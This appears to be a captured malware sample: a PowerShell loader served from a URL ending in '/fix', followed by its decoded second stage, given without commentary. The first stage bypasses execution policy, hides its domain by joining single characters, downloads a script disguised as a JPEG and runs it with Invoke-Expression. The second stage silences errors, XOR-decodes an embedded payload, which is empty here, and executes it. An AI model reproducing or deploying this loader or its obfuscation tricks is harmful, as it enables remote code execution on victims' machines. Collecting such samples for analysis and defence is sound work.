PowerShell Script (https://apioeaesr.icu/fix):
Set-ExecutionPolicy Bypass -Scope Process -Force;
try {
    $wc = New-Object System.Net.WebClient
    $domainParts = @('a','p','i','o','e','a','e','s','r','.','i','c','u')
    $domain = $domainParts -join ''
    $domain = "https://" + $domain + "/api/images.jpg"
    $script = $wc.DownloadString($domain)
    Invoke-Expression $script
} catch {
    $domainParts = @('a','p','i','o','e','a','e','s','r','.','i','c','u')
    $domain = $domainParts -join ''
    $domain = "https://" + $domain + "/api/images.jpg"
    $request = [System.Net.HttpWebRequest]::Create($domain)
    $response = $request.GetResponse()
    $stream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $script = $reader.ReadToEnd()
    $reader.Close()
    $response.Close()
    Invoke-Expression $script
}

---- Base64 Decoded PowerShell Script (https://apioeaesr.icu/api/images.jpg) ----

$ErrorActionPreference = 'SilentlyContinue'

$ProgressPreference = 'SilentlyContinue'

$global:WAcwt = '2PxniJ'
$global:sQGbq = ''
$global:OcZms = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global:sQGbq))
$global:UssZj = ''

for ($i = 0; $i -lt $global:OcZms.Length; $i++) {
    $keyChar = $global:WAcwt[$i % $global:WAcwt.Length]
    $encChar = $global:OcZms[$i]
    $global:UssZj += [char]([int][char]$encChar -bxor [int][char]$keyChar)
}

try { Invoke-Expression $global:UssZj } catch { & ([ScriptBlock]::Create($global:UssZj)) }

